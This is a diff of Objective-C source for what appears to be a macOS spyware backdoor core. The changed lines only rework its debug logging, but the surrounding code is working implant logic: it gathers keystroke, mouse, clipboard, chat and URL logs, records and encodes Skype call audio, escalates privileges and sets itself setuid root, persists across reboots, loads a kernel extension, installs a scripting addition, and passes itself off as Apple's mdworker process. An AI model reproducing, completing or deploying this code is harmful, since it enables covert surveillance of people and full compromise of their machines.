@@ -38,15 +38,13 @@
 #import "RCSMTaskManager.h"
 #import "RCSMOsaxFiles.h"
 
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
 #import "NSApplication+SystemVersion.h"
 
 #define ICON_FILENAME  @"q45tyh"
 
-//#define DEBUG_CORE
-//#define DEBUG_TMP
-//#define DEBUG_UI_SPOOF
-//#define DEBUG_VERBOSE_1
-//#define TEST_MODE
 
 //
 // Old notification system
@@ -136,7 +134,7 @@ static void computerWillShutdown(CFMachPortRef port,
       // Loginwindow put a shutdown confirm panel up on screen
       // The user has not necessarily even clicked on it yet
 #ifdef DEBUG_CORE
-      infoLog(ME, @"Request for Shutdown");
+      infoLog(@"Request for Shutdown");
 #endif
       shouldShutdown = true;
     }
@@ -145,14 +143,14 @@ static void computerWillShutdown(CFMachPortRef port,
       // Loginwindow put a restart confirm panel up on screen
       // The user has not necessarily even clicked on it yet
 #ifdef DEBUG_CORE
-      infoLog(ME, @"Request for Restart");
+      infoLog(@"Request for Restart");
 #endif
       shouldShutdown = true;
     }
   else if (header->msgh_id == gLWLogoutCancelNotificationToken) 
     {
 #ifdef DEBUG_CORE
-      infoLog(ME, @"Shutdown operation cancelled");
+      infoLog(@"Shutdown operation cancelled");
 #endif
       // Whatever shutdown, restart, or logout that was in progress has been cancelled.
       shouldShutdown = false;
@@ -166,7 +164,7 @@ static void computerWillShutdown(CFMachPortRef port,
       // this machine.
       //_setRootDomainProperty(CFSTR("System Shutdown"), kCFBooleanTrue);
 #ifdef DEBUG_CORE
-      infoLog(ME, @"Ok we're really shutting down NOW");
+      infoLog(@"Ok we're really shutting down NOW");
 #endif
       
       const char *userName = [NSUserName() UTF8String];
@@ -254,8 +252,8 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (void)_renameBackdoorAndRelaunch
 {
-#ifdef DEBUG
-  warnLog(ME, @"Spoofing and relaunching ourself, appName is %@", mApplicationName);
+#ifdef DEBUG_CORE
+  warnLog(@"Spoofing and relaunching ourself, appName is %@", mApplicationName);
 #endif
   
   //
@@ -291,8 +289,8 @@ static void computerWillShutdown(CFMachPortRef port,
     {
       NSFileHandle *lockFileHandle = [NSFileHandle fileHandleForReadingAtPath:
                                       lockFile];
-#ifdef DEBUG
-      NSLog(@"Lock file created succesfully");
+#ifdef DEBUG_CORE
+      infoLog(@"Lock file created succesfully");
 #endif
       
       if (lockFileHandle)
@@ -301,16 +299,16 @@ static void computerWillShutdown(CFMachPortRef port,
           
           if (flock(fd, LOCK_EX | LOCK_NB) != 0)
             {
-#ifdef DEBUG_ERRORS
-              NSLog(@"Failed to acquire advisory lock");
+#ifdef DEBUG_CORE
+              errorLog(@"Failed to acquire advisory lock");
 #endif
               
               return -1;
             }
           else
             {
-#ifdef DEBUG
-              NSLog(@"Advisory lock acquired correctly");
+#ifdef DEBUG_CORE
+              infoLog(@"Advisory lock acquired correctly");
 #endif
               
               return fd;
@@ -323,8 +321,8 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"%@", error);
+#ifdef DEBUG_CORE
+      errorLog(@"%@", error);
 #endif
     }
   
@@ -338,23 +336,23 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if (flock([self mLockFD], LOCK_UN) != 0)
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Error while removing advisory lock");
+#ifdef DEBUG_CORE
+      errorLog(@"Error while removing advisory lock");
 #endif
       return -1;
     }
   else
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Advisory lock removed correctly");
+#ifdef DEBUG_CORE
+      errorLog(@"Advisory lock removed correctly");
 #endif
       BOOL success = [[NSFileManager defaultManager] removeItemAtPath: aLockFile
                                                                 error: &error];
       
       if (success == NO)
         {
-#ifdef DEBUG_ERRORS
-          NSLog(@"Error while deleting lock file");
+#ifdef DEBUG_CORE
+          errorLog(@"Error while deleting lock file");
 #endif
           return -1;
         }
@@ -459,8 +457,8 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if (!frameSize)
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Error while getting frameSize from speex");
+#ifdef DEBUG_CORE
+      errorLog(@"Error while getting frameSize from speex");
 #endif
       
       speex_encoder_destroy(speexState);
@@ -469,8 +467,8 @@ static void computerWillShutdown(CFMachPortRef port,
       return FALSE;
     }
   
-#ifdef DEBUG
-  NSLog(@"frameSize: %d", frameSize);
+#ifdef DEBUG_CORE
+  infoLog(@"frameSize: %d", frameSize);
 #endif
   
   //
@@ -478,8 +476,8 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   if (!(outputBuffer = (char *)malloc(frameSize * SINGLE_LPCM_UNIT_SIZE + sizeof(u_int))))
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Error while allocating output buffer");
+#ifdef DEBUG_CORE
+      errorLog(@"Error while allocating output buffer");
 #endif
       
       speex_encoder_destroy(speexState);
@@ -493,8 +491,8 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   if (!(inputBuffer = (SInt16 *)malloc(frameSize * sizeof(SInt16))))
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Error while allocating input float buffer");
+#ifdef DEBUG_CORE
+      errorLog(@"Error while allocating input float buffer");
 #endif
       
       free(outputBuffer);
@@ -509,8 +507,8 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   if (!(floatToSInt16Buffer = (SInt16 *)malloc(audioChunkSize)))
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Failed to allocate floatToSInt16Buffer");
+#ifdef DEBUG_CORE
+      errorLog(@"Failed to allocate floatToSInt16Buffer");
 #endif
       free(outputBuffer);
       free(inputBuffer);
@@ -534,8 +532,8 @@ static void computerWillShutdown(CFMachPortRef port,
   
   ptrSInt16Buffer = (char *)floatToSInt16Buffer;
 
-#ifdef DEBUG_ERRORS
-  NSLog(@"Audio Chunk SIZE: %d", audioChunkSize);
+#ifdef DEBUG_SPEEX
+  infoLog(@"Audio Chunk SIZE: %d", audioChunkSize);
   
   // Write a Wav
   NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
@@ -626,7 +624,7 @@ static void computerWillShutdown(CFMachPortRef port,
         {
           NSMutableData *tempData = [[NSMutableData alloc] initWithBytes: outputBuffer
                                                                   length: bytesWritten + sizeof(u_int)];
-#ifdef DEBUG_ERRORS
+#ifdef DEBUG_SPEEX
           [fileData appendData: tempData];
 #endif
           [_logManager writeDataToLog: tempData
@@ -639,7 +637,7 @@ static void computerWillShutdown(CFMachPortRef port,
         {
           NSMutableData *tempData = [[NSMutableData alloc] initWithBytes: outputBuffer
                                                                   length: bytesWritten + sizeof(u_int)];
-#ifdef DEBUG_ERRORS
+#ifdef DEBUG_SPEEX
           [fileData appendData: tempData];
 #endif
           [_logManager writeDataToLog: tempData
@@ -650,7 +648,7 @@ static void computerWillShutdown(CFMachPortRef port,
         }
     }
 
-#ifdef DEBUG_ERRORS
+#ifdef DEBUG_SPEEX
   time_t ut;
   time(&ut);
   
@@ -683,8 +681,8 @@ static void computerWillShutdown(CFMachPortRef port,
   RCSMLogManager *_logManager   = [RCSMLogManager sharedInstance];
   RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
   
-#ifdef DEBUG
-  NSLog(@"Start receiving log from agents");
+#ifdef DEBUG_CORE
+  infoLog(@"Start receiving log from agents");
 #endif
   
   NSMutableData *voipInputData        = nil;
@@ -729,8 +727,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                        forAgent: AGENT_URL
                                       withLogID: 0] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"URL logged correctly");
+#ifdef DEBUG_CORE
+                    infoLog(@"URL logged correctly");
 #endif
                   }
                 
@@ -745,13 +743,13 @@ static void computerWillShutdown(CFMachPortRef port,
                                        forAgent: AGENT_KEYLOG
                                       withLogID: 0] == TRUE)
                   {
-#ifdef DEBUG_TMP
-                    debugLog(ME, @"Log header agentID %x, status %x command size %d keylog %S", 
+#ifdef DEBUG_CORE
+                    warnLog(@"Log header agentID %x, status %x command size %d keylog %S", 
                              shMemLog->agentID, 
                              shMemLog->status,
                              shMemLog->commandDataSize,
                              shMemLog->commandData);
-                    NSLog(@"%s: header data size %d", __FUNCTION__, sizeof(shMemoryLog));
+                    infoLog(@"%s: header data size %d", __FUNCTION__, sizeof(shMemoryLog));
 #endif
                   }
             
@@ -759,8 +757,8 @@ static void computerWillShutdown(CFMachPortRef port,
               }
             case AGENT_MOUSE:
               {
-#ifdef DEBUG
-                NSLog(@"Receveid mouse log");
+#ifdef DEBUG_CORE
+                infoLog(@"Receveid mouse log");
 #endif
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
@@ -788,21 +786,21 @@ static void computerWillShutdown(CFMachPortRef port,
                                            forAgent: AGENT_MOUSE
                                           withLogID: 0] == TRUE)
                       {
-#ifdef DEBUG
-                        NSLog(@"%s Mouse click logged correctly", __FUNCTION__);
+#ifdef DEBUG_CORE
+                        infoLog(@"%s Mouse click logged correctly", __FUNCTION__);
 #endif
                       }
                     else
                       {
-#ifdef DEBUG
-                        NSLog(@"%s Error while writing data to AGENT_MOUSE log", __FUNCTION__);
+#ifdef DEBUG_CORE
+                        errorLog(@"%s Error while writing data to AGENT_MOUSE log", __FUNCTION__);
 #endif
                       }
                   }
                 else
                   {
-#ifdef DEBUG
-                    NSLog(@"%s Error while creating AGENT_MOUSE log", __FUNCTION__);
+#ifdef DEBUG_CORE
+                    errorLog(@"%s Error while creating AGENT_MOUSE log", __FUNCTION__);
 #endif
                   }
                 
@@ -816,8 +814,8 @@ static void computerWillShutdown(CFMachPortRef port,
               }
             case AGENT_VOIP:
               {
-#ifdef DEBUG_VERBOSE_1
-                NSLog(@"Logs from Voip Agent");
+#ifdef DEBUG_CORE
+                verboseLog(@"Logs from Voip Agent");
 #endif
                 //
                 // Protocol looks like
@@ -831,8 +829,8 @@ static void computerWillShutdown(CFMachPortRef port,
                   {
                   case CM_LOG_DATA:
                     {
-#ifdef DEBUG_VERBOSE_1
-                      NSLog(@"[ii] Received audio data from Skype");
+#ifdef DEBUG_CORE
+                      verboseLog(@"[ii] Received audio data from Skype");
 #endif
                       
                       if (shMemLog->flag == SKYPE_CHANNEL_INPUT)
@@ -864,8 +862,8 @@ static void computerWillShutdown(CFMachPortRef port,
                     }
                   case CM_CLOSE_LOG_WITH_HEADER:
                     {
-#ifdef DEBUG
-                      NSLog(@"[ii] Received a close log command from skype");
+#ifdef DEBUG_CORE
+                      infoLog(@"[ii] Received a close log command from skype");
 #endif
                       
                       NSData *_localPeer    = nil;
@@ -878,9 +876,9 @@ static void computerWillShutdown(CFMachPortRef port,
                       
                       if ((shMemLog->flag & SKYPE_CHANNEL_INPUT) == SKYPE_CHANNEL_INPUT)
                         {
-#ifdef DEBUG
-                          NSLog(@"[ii] Voip - Closing input channel");
-                          NSLog(@"[ii] audioChunk size: %d", [voipInputData length]);
+#ifdef DEBUG_CORE
+                          infoLog(@"[ii] Voip - Closing input channel");
+                          infoLog(@"[ii] audioChunk size: %d", [voipInputData length]);
 #endif
                           
                           voipAdditionalStruct *_voipHeader = (voipAdditionalStruct *)[logData bytes];
@@ -909,9 +907,9 @@ static void computerWillShutdown(CFMachPortRef port,
                           
                           hiStopTime = _voipHeader->hiStopTimestamp;
                           loStopTime = _voipHeader->loStopTimestamp;
-#ifdef DEBUG
-                          NSLog(@"hiStartRec: %x", _voipHeader->hiStartTimestamp);
-                          NSLog(@"loStartRec: %x", _voipHeader->loStartTimestamp);
+#ifdef DEBUG_CORE
+                          infoLog(@"hiStartRec: %x", _voipHeader->hiStartTimestamp);
+                          infoLog(@"loStartRec: %x", _voipHeader->loStartTimestamp);
 #endif
                           NSMutableData *voipAdditionalHeader = [[NSMutableData alloc] initWithData:
                                                                  [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
@@ -927,8 +925,8 @@ static void computerWillShutdown(CFMachPortRef port,
                             }
                           else
                             {
-#ifdef DEBUG
-                              NSLog(@"%s Error while creating log for input (skype)", __FUNCTION__);
+#ifdef DEBUG_CORE
+                              errorLog(@"%s Error while creating log for input (skype)", __FUNCTION__);
 #endif
                             }
                             
@@ -946,8 +944,8 @@ static void computerWillShutdown(CFMachPortRef port,
                             {
                               gHasVoipInFinishedRecording = YES;
                               
-#ifdef DEBUG
-                              NSLog(@"Generating last entry log for input");
+#ifdef DEBUG_CORE
+                              infoLog(@"Generating last entry log for input");
 #endif
                               NSMutableData *entryData = [[NSMutableData alloc]
                                                           initWithLength: sizeof(voipAdditionalStruct)];
@@ -1001,8 +999,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                 }
                               else
                                 {
-#ifdef DEBUG
-                                  NSLog(@"%s Error while creating close log file for input (skype)", __FUNCTION__);
+#ifdef DEBUG_CORE
+                                  errorLog(@"%s Error while creating close log file for input (skype)", __FUNCTION__);
 #endif
                                 }
                               
@@ -1020,9 +1018,9 @@ static void computerWillShutdown(CFMachPortRef port,
                         }
                       else if ((shMemLog->flag & SKYPE_CHANNEL_OUTPUT) == SKYPE_CHANNEL_OUTPUT)
                         {
-#ifdef DEBUG
-                          NSLog(@"[ii] Voip - Closing output channel");
-                          NSLog(@"[ii] audioChunk size: %d", [voipOutputData length]);
+#ifdef DEBUG_CORE
+                          infoLog(@"[ii] Voip - Closing output channel");
+                          infoLog(@"[ii] audioChunk size: %d", [voipOutputData length]);
 #endif
                           voipAdditionalStruct *_voipHeader = (voipAdditionalStruct *)[logData bytes];
                           int additionalSize = sizeof(voipAdditionalStruct)
@@ -1065,8 +1063,8 @@ static void computerWillShutdown(CFMachPortRef port,
                             }
                           else
                             {
-#ifdef DEBUG
-                              NSLog(@"%s Error while creating log for output (skype)", __FUNCTION__);
+#ifdef DEBUG_CORE
+                              errorLog(@"%s Error while creating log for output (skype)", __FUNCTION__);
 #endif
                             }
                           
@@ -1084,8 +1082,8 @@ static void computerWillShutdown(CFMachPortRef port,
                             {
                               gHasVoipOutFinishedRecording = YES;
                               
-#ifdef DEBUG
-                              NSLog(@"Generating last entry log for output");
+#ifdef DEBUG_CORE
+                              infoLog(@"Generating last entry log for output");
 #endif
                               NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(voipAdditionalStruct)];
                               
@@ -1137,8 +1135,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                 }
                               else
                                 {
-#ifdef DEBUG
-                                  NSLog(@"%s Error while creating close log file for output (skype)", __FUNCTION__);
+#ifdef DEBUG_CORE
+                                  errorLog(@"%s Error while creating close log file for output (skype)", __FUNCTION__);
 #endif
                                 }
                                 
@@ -1163,8 +1161,8 @@ static void computerWillShutdown(CFMachPortRef port,
               }
             case AGENT_CHAT:
               {
-#ifdef DEBUG
-                NSLog(@"Logs from agent CHAT");
+#ifdef DEBUG_CORE
+                infoLog(@"Logs from agent CHAT");
 #endif    
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
@@ -1173,22 +1171,22 @@ static void computerWillShutdown(CFMachPortRef port,
                                        forAgent: AGENT_CHAT
                                       withLogID: 0] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"CHAT message logged correctly");
+#ifdef DEBUG_CORE
+                    infoLog(@"CHAT message logged correctly");
 #endif
                   }
                 else
                   {
-#ifdef DEBUG  
-                    NSLog(@"An error occurred while logging CHAT data");
+#ifdef DEBUG_CORE  
+                    errorLog(@"An error occurred while logging CHAT data");
 #endif
                   }
                 break;
               }
             case AGENT_CLIPBOARD:
               {
-#ifdef DEBUG
-                NSLog(@"Logs from clipboard");
+#ifdef DEBUG_CORE
+                infoLog(@"Logs from clipboard");
 #endif
                 
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
@@ -1198,8 +1196,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                        forAgent: AGENT_CLIPBOARD
                                       withLogID: 0] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Clipboard logged correctly");
+#ifdef DEBUG_CORE
+                    infoLog(@"Clipboard logged correctly");
 #endif
                   }
             
@@ -1207,8 +1205,8 @@ static void computerWillShutdown(CFMachPortRef port,
               }
             default:
               {
-#ifdef DEBUG
-                NSLog(@"Agent not yet implemented suckers: %d", shMemLog->agentID);
+#ifdef DEBUG_CORE
+                infoLog(@"Agent not yet implemented suckers: %d", shMemLog->agentID);
 #endif
                 break;
               }
@@ -1232,34 +1230,34 @@ static void computerWillShutdown(CFMachPortRef port,
       
       NSMutableDictionary *agentConfiguration = [_taskManager getConfigForAgent: AGENT_VOIP];
       
-#ifdef DEBUG
+#ifdef DEBUG_CORE
       if (x == 0)
-        NSLog(@"Checking if skype is running");
+        infoLog(@"Checking if skype is running");
 #endif
 
       if (agentConfiguration != nil)
         {
           [agentConfiguration retain];
           
-#ifdef DEBUG
+#ifdef DEBUG_CORE
           if (x == 0)
-            NSLog(@"Got skype conf");
+            warnLog(@"Got skype conf");
 #endif
           
           if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
               || [agentConfiguration objectForKey: @"status"] == AGENT_START)
             {
-#ifdef DEBUG
+#ifdef DEBUG_CORE
               if (x == 0)
-                NSLog(@"Skype is running");
+                warnLog(@"Skype is running");
 #endif
               [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.001]];
             }
           else
             {
-#ifdef DEBUG
+#ifdef DEBUG_CORE
               if (x == 0)
-                NSLog(@"Skype is not running");
+                warnLog(@"Skype is not running");
 #endif
               [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.1]];
             }
@@ -1347,8 +1345,8 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (void)_createInternalFilesAndFolders
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_CORE
+  infoLog(@"");
 #endif
   
   NSTask *task = [[NSTask alloc] init];
@@ -1369,8 +1367,8 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *taskOutput  = [[NSString alloc] initWithData: taskData
                                                 encoding: NSUTF8StringEncoding];
   
-#ifdef DEBUG
-  infoLog(ME, @"taskOutput: %@", taskOutput);
+#ifdef DEBUG_CORE
+  infoLog(@"taskOutput: %@", taskOutput);
 #endif
   [task release];
   
@@ -1461,9 +1459,9 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                            [[NSBundle mainBundle] bundlePath],
                            gKextName];
-#ifdef DEBUG
-  infoLog(ME, @"tempKextDir: %@", tempKextDir);
-  infoLog(ME, @"backdoorContentPath: %@", _backdoorContentPath);
+#ifdef DEBUG_CORE
+  infoLog(@"tempKextDir: %@", tempKextDir);
+  infoLog(@"backdoorContentPath: %@", _backdoorContentPath);
 #endif
   
   [[NSFileManager defaultManager] moveItemAtPath: tempKextDir
@@ -1517,8 +1515,8 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   if (getuid() == 0) // R00TFWHOOT
     {
-#ifdef DEBUG
-      infoLog(ME, @"Root executed us, we don't need him :)");
+#ifdef DEBUG_CORE
+      infoLog(@"Root executed us, we don't need him :)");
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
@@ -1584,15 +1582,15 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   if ([gSharedMemoryCommand createMemoryRegion] == -1)
     {
-#ifdef DEBUG
-      errorLog(ME, @"There was an error while creating the Commands Shared Memory");
+#ifdef DEBUG_CORE
+      errorLog(@"There was an error while creating the Commands Shared Memory");
 #endif
       return NO;
     }
   if ([gSharedMemoryCommand attachToMemoryRegion] == -1)
     {
-#ifdef DEBUG
-      errorLog(ME, @"There was an error while attaching to the Commands Shared Memory");
+#ifdef DEBUG_CORE
+      errorLog(@"There was an error while attaching to the Commands Shared Memory");
 #endif
       return NO;
     }
@@ -1601,16 +1599,16 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if ([gSharedMemoryLogging createMemoryRegion] == -1)
     {
-#ifdef DEBUG
-      errorLog(ME, @"There was an error while creating the Logging Shared Memory");
+#ifdef DEBUG_CORE
+      errorLog(@"There was an error while creating the Logging Shared Memory");
 #endif
       return NO;
     }
   
   if ([gSharedMemoryLogging attachToMemoryRegion] == -1)
     {
-#ifdef DEBUG
-      errorLog(ME, @"There was an error while attaching to the Logging Shared Memory");
+#ifdef DEBUG_CORE
+      errorLog(@"There was an error while attaching to the Logging Shared Memory");
 #endif
       return NO;
     }
@@ -1630,10 +1628,10 @@ static void computerWillShutdown(CFMachPortRef port,
   if (![mApplicationName isEqualToString: @"System Preferences"]
       && getuid() != 0)
     {
-#ifdef DEBUG
-      infoLog(ME, @"Registering NSPort to NameServer");
-      infoLog(ME, @"uid : %d", getuid());
-      infoLog(ME, @"euid: %d", geteuid());
+#ifdef DEBUG_CORE
+      infoLog(@"Registering NSPort to NameServer");
+      infoLog(@"uid : %d", getuid());
+      infoLog(@"euid: %d", geteuid());
 #endif
     
       //
@@ -1643,15 +1641,15 @@ static void computerWillShutdown(CFMachPortRef port,
       if (![[NSPortNameServer systemDefaultPortNameServer] registerPort: port
                                                                    name: @"com.apple.mdworker.executed"])
         {
-#ifdef DEBUG
-          errorLog(ME, @"NSPort check error! Backdoor is already running");
+#ifdef DEBUG_CORE
+          errorLog(@"NSPort check error! Backdoor is already running");
 #endif
           exit(-1);
         }
       else
         {
-#ifdef DEBUG
-          warnLog(ME, @"Port Registered correctly");
+#ifdef DEBUG_CORE
+          warnLog(@"Port Registered correctly");
 #endif
         }
     }
@@ -1659,8 +1657,8 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (BOOL)_SLIEscalation
 {
-#ifdef DEBUG
-  NSLog(@"sliPlist mode");
+#ifdef DEBUG_CORE
+  infoLog(@"sliPlist mode");
 #endif
 
   if (getuid() != 0 && geteuid() != 0)
@@ -1671,8 +1669,8 @@ static void computerWillShutdown(CFMachPortRef port,
           //
           // We failed in obtaining root privs if we're here dude
           //
-#ifdef DEBUG_ERRORS
-          errorLog(ME, @"SLI FAIL - /facepalm");
+#ifdef DEBUG_CORE
+          errorLog(@"SLI FAIL - /facepalm");
 #endif
         }
       else
@@ -1689,8 +1687,8 @@ static void computerWillShutdown(CFMachPortRef port,
       // This means that the machine has been rebooted and we already
       // obtained root privs through the SLI escalation
       //
-#ifdef DEBUG
-      NSLog(@"sli mode success");
+#ifdef DEBUG_CORE
+      infoLog(@"sli mode success");
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
@@ -1713,14 +1711,14 @@ static void computerWillShutdown(CFMachPortRef port,
       //
       if (![mBinaryName isEqualToString: @"System Preferences"])
         {
-#ifdef DEBUG
-          infoLog(ME, @"Making backdoor resident");
+#ifdef DEBUG_CORE
+          infoLog(@"Making backdoor resident");
 #endif
       
           if ([self makeBackdoorResident] == NO)
             {
-#ifdef DEBUG
-              errorLog(ME, @"An error occurred while making backdoor resident");
+#ifdef DEBUG_CORE
+              errorLog(@"An error occurred while making backdoor resident");
 #endif
             }
       
@@ -1756,15 +1754,15 @@ static void computerWillShutdown(CFMachPortRef port,
       NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"mdworker.flg"];
-#ifdef DEBUG
-      infoLog(ME, @"Looking for mdworker.flg");
+#ifdef DEBUG_CORE
+      infoLog(@"Looking for mdworker.flg");
 #endif
       
       if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                 isDirectory: NO])
         {
-#ifdef DEBUG
-          warnLog(ME, @"mdworker.flg not found. Relaunching through launchd");
+#ifdef DEBUG_CORE
+          warnLog(@"mdworker.flg not found. Relaunching through launchd");
 #endif
           [gUtil dropExecFlag];
           
@@ -1907,8 +1905,8 @@ static void computerWillShutdown(CFMachPortRef port,
                        OSAX_FOLDER,
                        gInputManagerName];
 
-#ifdef DEBUG_TMP
-  debugLog(ME, @"destination osax %@", destDir);
+#ifdef DEBUG_CORE
+  warnLog(@"destination osax %@", destDir);
 #endif
   
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
@@ -1928,15 +1926,15 @@ static void computerWillShutdown(CFMachPortRef port,
   
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
   
-#ifdef DEBUG
-  debugLog(ME, @"Original info.plist for osax %@", info_orig_pl);
+#ifdef DEBUG_CORE
+  warnLog(@"Original info.plist for osax %@", info_orig_pl);
 #endif
   
   NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
                                                               withString: gInputManagerName];
   
-#ifdef DEBUG
-  debugLog(ME, @"info.plist for osax %@", info_pl);
+#ifdef DEBUG_CORE
+  warnLog(@"info.plist for osax %@", info_pl);
 #endif
   
   [info_pl writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Info.plist" 
@@ -1987,32 +1985,32 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if (kernFD == -1) 
     {
-#ifdef DEBUG
-      errorLog(ME, @"Error on open");
+#ifdef DEBUG_CORE
+      errorLog(@"Error on open");
 #endif
       return;
     }
   
   if (gBackdoorFD == -1) 
     {
-#ifdef DEBUG
-      errorLog(ME, @"Error on ioctl device");
+#ifdef DEBUG_CORE
+      errorLog(@"Error on ioctl device");
 #endif
       return;
   }
   
   if (stat(filename, &sb) == -1)
     {
-#ifdef DEBUG
-      errorLog(ME, @"Error on stat");
+#ifdef DEBUG_CORE
+      errorLog(@"Error on stat");
 #endif
       return;
     }
   
   filesize = sb.st_size;
 
-#ifdef DEBUG
-  infoLog(ME, @"filesize: %d\n", filesize);
+#ifdef DEBUG_CORE
+  infoLog(@"filesize: %d\n", filesize);
 #endif
   
   if ((imageBase = mmap(0,
@@ -2022,15 +2020,15 @@ static void computerWillShutdown(CFMachPortRef port,
                         kernFD,
                         0)) == (caddr_t)-1)
     {
-#ifdef DEBUG
-      errorLog(ME, @"Error on mmap\n");
+#ifdef DEBUG_CORE
+      errorLog(@"Error on mmap\n");
 #endif
 
       return;
     }
   
-#ifdef DEBUG
-  infoLog(ME, @"file mapped @ 0x%lx\n", (unsigned long)imageBase);
+#ifdef DEBUG_CORE
+  infoLog(@"file mapped @ 0x%lx\n", (unsigned long)imageBase);
 #endif
   
   // Sending Symbol
@@ -2113,7 +2111,7 @@ static void computerWillShutdown(CFMachPortRef port,
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
 #ifdef DEBUG_CORE
-  infoLog(ME, @"Initializing shutdown notifications");
+  infoLog(@"Initializing shutdown notifications");
 #endif
   
   CFMachPortRef       gNotifyMachPort     = NULL;
@@ -2130,7 +2128,7 @@ static void computerWillShutdown(CFMachPortRef port,
   if (gOSMajor == 10 && gOSMinor == 5)
     {
 #ifdef DEBUG_CORE
-      infoLog(ME, @"Registering notifications for Leopard");
+      infoLog(@"Registering notifications for Leopard");
 #endif
       notify_return = notify_register_mach_port(kLLWShutdowntInitiated,
                                                 &our_port,
@@ -2155,7 +2153,7 @@ static void computerWillShutdown(CFMachPortRef port,
   else if (gOSMajor == 10 && gOSMinor == 6)
     {
 #ifdef DEBUG_CORE
-      infoLog(ME, @"Registering notifications for Snow Leopard");
+      infoLog(@"Registering notifications for Snow Leopard");
 #endif
       notify_return = notify_register_mach_port(kSLLWShutdowntInitiated,
                                                 &our_port,
@@ -2356,20 +2354,20 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if ([workingMode isEqualToString: SLIPLIST])
     {
-#ifdef DEBUG
-      infoLog(ME, @"SLIPLIST Mode ON");
+#ifdef DEBUG_CORE
+      infoLog(@"SLIPLIST Mode ON");
 #endif
       if (gOSMajor == 10 && gOSMinor == 5)
         {
-#ifdef DEBUG
-          infoLog(ME, @"System is Leopard");
+#ifdef DEBUG_CORE
+          infoLog(@"System is Leopard");
 #endif
           sliSuccess = [self _SLIEscalation];
         }
       else if (gOSMajor == 10 && gOSMinor == 6)
         {
-#ifdef DEBUG
-          warnLog(ME, @"SLIPLIST on Snow Leopard, just going with noprivs");
+#ifdef DEBUG_CORE
+          warnLog(@"SLIPLIST on Snow Leopard, just going with noprivs");
 #endif
           noPrivs = YES;
         }
@@ -2380,8 +2378,8 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else
     {
-#ifdef DEBUG
-      infoLog(ME, @"Dev mode on");
+#ifdef DEBUG_CORE
+      infoLog(@"Dev mode on");
       
       sliSuccess = [self _SLIEscalation];
 #endif
@@ -2393,58 +2391,58 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   if ([self isBackdoorAlreadyResident] == YES)
     {
-#ifdef DEBUG
-      warnLog(ME, @"Backdoor has been made already resident");
+#ifdef DEBUG_CORE
+      warnLog(@"Backdoor has been made already resident");
 #endif
       
       if ([gUtil isBackdoorPresentInSLI: [gUtil mBackdoorPath]] == YES)
         {
-#ifdef DEBUG
-          infoLog(ME, @"Removing the backdoor entry form the global SLI");
+#ifdef DEBUG_CORE
+          infoLog(@"Removing the backdoor entry form the global SLI");
 #endif
           if ([gUtil removeBackdoorFromSLIPlist] == YES)
             {
-#ifdef DEBUG
-              infoLog(ME, @"Backdoor removed correctly from SLI");
+#ifdef DEBUG_CORE
+              infoLog(@"Backdoor removed correctly from SLI");
 #endif
             }
         }
     }
   else
     {
-#ifdef DEBUG
-      warnLog(ME, @"Backdoor has not been made resident yet");
-      infoLog(ME, @"sliSuccess: %d", sliSuccess);
-      infoLog(ME, @"workingMode: %@", ([workingMode isEqualToString: SLIPLIST]) ? @"SLIPLIST" : @"UISPOOF");
+#ifdef DEBUG_CORE
